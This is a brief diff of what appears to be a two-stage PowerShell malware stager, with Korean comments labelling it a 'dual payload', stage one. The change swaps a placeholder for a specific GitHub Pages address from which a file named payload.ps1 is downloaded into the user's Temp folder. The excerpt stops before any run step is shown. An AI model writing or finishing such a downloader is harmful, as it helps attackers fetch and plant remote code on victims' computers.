@@ -1,7 +1,7 @@
 # 이중화 페이로드
 
 # 1단계: PowerShell 스크립트
-$payloadUrl = "https://username.github.io/payload/payload.ps1"
+$payloadUrl = "https://remembermepls.github.io/payload/payload.ps1"
 $outputPath = "$env:Temp\payload.ps1"
 
 # 페이로드 다운로드
